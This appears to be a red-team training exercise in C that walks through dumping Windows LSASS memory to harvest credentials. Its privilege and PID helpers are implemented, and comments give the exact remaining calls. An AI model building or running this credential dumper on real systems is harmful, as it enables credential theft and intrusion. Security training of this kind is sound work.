// CFarer - Red Team Exercise 04
// TOPIC: LSASS Minidump - MiniDumpWriteDump
// DIFFICULTY: Advanced  PLATFORM: Windows
// PURPOSE: Authorized penetration testing education - credential access
//
// LSASS (Local Security Authority Subsystem Service) holds NTLM hashes,
// Kerberos tickets, and plaintext credentials in memory.
// MiniDumpWriteDump() writes a full process memory dump to disk.
// Mimikatz, pypykatz, and similar tools can then parse credentials from the dump.
//
// REQUIRES: SeDebugPrivilege (admin or SYSTEM).
//
// Steps:
//   1. Enable SeDebugPrivilege (same as wi06 token privileges exercise).
//   2. Find LSASS PID via CreateToolhelp32Snapshot + Process32Next (ProcessEntry32.szExeFile == "lsass.exe").
//   3. OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid).
//   4. CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL).
//   5. MiniDumpWriteDump(hProcess, lsass_pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL).
//   6. CloseHandle both, report size of dump file.
//
// NOTE: Requires admin. Defender will block/quarantine the dump file.
//       Use in isolated lab VMs only. Output is forensic evidence.

#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#pragma comment(lib, "dbghelp.lib")

static BOOL enable_debug_privilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    LUID luid;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
    TOKEN_PRIVILEGES tp = {1, {{ luid, SE_PRIVILEGE_ENABLED }}};
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}

static DWORD find_lsass_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main(void) {
    // TODO 1: enable SeDebugPrivilege
    if (!enable_debug_privilege()) {
        fprintf(stderr, "SeDebugPrivilege failed: %lu (need admin)\n", GetLastError());
        return 1;
    }
    printf("SeDebugPrivilege enabled\n");

    // TODO 2: find LSASS PID
    DWORD lsass_pid = 0; // replace: lsass_pid = find_lsass_pid();
    if (!lsass_pid) { fprintf(stderr, "LSASS not found\n"); return 1; }
    printf("LSASS PID: %lu\n", lsass_pid);

    // TODO 3: OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid)
    HANDLE hProc = NULL; // replace
    if (!hProc) {
        fprintf(stderr, "OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    // TODO 4: CreateFileA("lsass.dmp", ...)
    HANDLE hFile = INVALID_HANDLE_VALUE;
    // hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL,
    //                     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // TODO 5: MiniDumpWriteDump(hProc, lsass_pid, hFile,
    //           MiniDumpWithFullMemory, NULL, NULL, NULL)
    BOOL ok = FALSE;
    if (ok)
        printf("Dump written to lsass.dmp\n");
    else
        fprintf(stderr, "MiniDumpWriteDump failed: %lu\n", GetLastError());

    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    CloseHandle(hProc);
    return ok ? 0 : 1;
}

// I AM NOT DONE
